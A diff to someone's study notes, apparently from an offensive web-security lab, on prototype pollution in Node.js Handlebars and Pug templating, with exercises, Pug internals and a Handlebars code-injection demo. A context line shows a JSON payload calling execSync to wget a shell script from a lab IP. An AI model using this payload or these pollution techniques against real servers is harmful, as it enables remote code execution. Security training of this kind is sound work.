@@ -127,3 +127,105 @@ So the json payload looks like:
   "escape":"function(x){process.mainModule.require('child_process').execSync('/usr/bin/wget http://192.168.119.154/shell.sh');}"
 }
 ``` 
+## handlebars rce & extramile
+## exercises
+
+Follow along with this section but connect to the remote debugger and observe the prototype pollution exploit.  
+
+Why can we not reach RCE with the pendingContent exploit?  
+The pendingContent variable is escaped
+Obtain a working XSS with handlebars using the pendingContent exploit.  
+The interesting thing here is that because the xss is through protoype pollution and the application is server side node js, its persistent until application is restarted.
+
+Unset pendingContent to return to normal functionality.  
+
+Extra Mile  
+
+Switch to the Pug templating engine. Discover a mechanism to detect if the target is running Pug using prototype pollution. Using this mechanism, obtain XSS against the target.  
+
+### Mapping out the library
+- Main file: /node_modules/pug/lib/index.js
+  - Code Generation: /node_modules/pug-code-gen/index.js
+    - exports a function generateCode which calls the compiler function/class.
+      - Compiler function takes an options argument which may be a proto pollution vector.
+  - exports.render function on line 401
+    - the render functions calls handleTemplateCache which calls exports.compile
+  - exports.compile is defined on line 264
+    - exports.compile calls compileBody
+  - compileBody defined on line 77
+    - this function builds the abstract syntax tree(ast)
+      - this is accomplished by using load.string on line 82
+    - line 197 begins the compulation phase where the template is turned into javascript, in particular this is where generateCode is called.
+  - load function defined in /node_modules/pug-load/index.js, imported on line 18
+    - load.string is just a wrapper over load.
+    - interestingly this package uses assign from the object-assign library, so this is another potential vector of proto inj
+  - Lexer: /node_modules/pug-lexer/index.js
+    - the lexer seems to what will check for syntactic erros thus, this is likely to be the file with which we can debug erros
+  - Customizing template compiliation: /node_modules/pug-attrs/index.js
+
+After mapping out the application a bit my general plan is to play with render via:  
+```js
+docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
+```
+In general the pug workflow is as such:
+```js
+pug = require("pug")
+const compiledFunction = pug.compile('hello #{name}')
+console.log(compiledFunction({name:'Donkey'}))
+```
+```
+> pug = require("pug")
+{
+  name: 'Pug',
+  runtime: {
+    merge: [Function: pug_merge],
+    classes: [Function: pug_classes],
+    style: [Function: pug_style],
+    attr: [Function: pug_attr],
+    attrs: [Function: pug_attrs],
+    escape: [Function: pug_escape],
+    rethrow: [Function: pug_rethrow]
+  },
+  cache: {},
+  filters: {},
+  compile: [Function (anonymous)],
+  compileClientWithDependenciesTracked: [Function (anonymous)],
+  compileClient: [Function (anonymous)],
+  compileFile: [Function (anonymous)],
+  render: [Function (anonymous)],
+  renderFile: [Function (anonymous)],
+  compileFileClient: [Function (anonymous)],
+  __express: [Function (anonymous)]
+}
+> const compiledFunction = pug.compile('hello #{name}')
+undefined
+> console.log(compiledFunction({name:'Donkey'}))
+<hello>Donkey</hello>
+undefined
+globals: options.globals,
+```
+### Understanding options
+https://pugjs.org/api/reference.html
+### pollution
+/node/modules/pug-walk/index.js:37 contains the pollution point.
+Specifically we can pollute the block property.
+Pug works as follows
+lex produces tokens => parser takes the tokens and produces the abstract syntax tree => linker => walker(injection point here) => code generation
+
+## handlebars shell
+we can debug in interactive node with:
+```js
+Handlebars = require("handlebars")
+ast = Handlebars.parse('{{someHelper "some string" 12345 true undefined null}}')
+ast.body[0].params[1]
+Handlebars.precompile(ast)
+ast.body[0].params[1].value = "console.log('haxhaxhax')"
+precompiled = Handlebars.precompile(ast)
+eval("compiled = " + precompiled)
+tem = Handlebars.template(compiled)
+tem({})
+```
+The value we are interested in changed then is:
+```js
+ast.body[0].params[1].value = "console.log('haxhaxhax')"
+```
